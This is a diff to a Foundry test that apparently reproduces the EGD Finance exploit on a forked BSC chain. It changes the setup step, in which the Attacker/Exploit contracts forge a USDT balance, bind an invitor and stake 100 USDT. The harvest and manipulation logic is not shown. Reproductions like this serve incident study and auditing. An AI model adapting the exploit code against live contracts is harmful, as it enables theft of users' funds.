@@ -41,7 +41,7 @@ contract Attacker is Test {
         console.log("--------------------  Pre-work, stake 10 USDT to EGD Finance --------------------");
         console.log("Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8");
         cheat.createSelectFork("bsc", 20245522);
-        console.log("Attacker Stake 10 USDT to EGD Finance");
+        console.log("Attacker Stake 100 USDT to EGD Finance");
         exploit.stake();
         /* ------------------------------------------------------------------------------------------- */
         cheat.roll(20245539);   // block.number = 20245539
@@ -68,16 +68,16 @@ contract Exploit is Test{
     uint256 borrow2;
 
     function stake() public {
-        // Give exploit contract 10 USDT
-        stdstore.target(address(usdt))
+        // Give exploit contract 100 USDT
+        stdstore.target(usdt)
                 .sig(IERC20(usdt).balanceOf.selector)
                 .with_key(address(this))
-                .checked_write(10 * 10e18);
+                .checked_write(100 ether);
         // Set invitor
         IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
-        // Stake 10 USDT
-        IERC20(usdt).approve(EGD_Finance, 10 * 10e18);
-        IEGD_Finance(EGD_Finance).stake(10 * 10e18);
+        // Stake 100 USDT
+        IERC20(usdt).approve(EGD_Finance, 100 ether);
+        IEGD_Finance(EGD_Finance).stake(100 ether);
     }
 
     function harvest() public {        
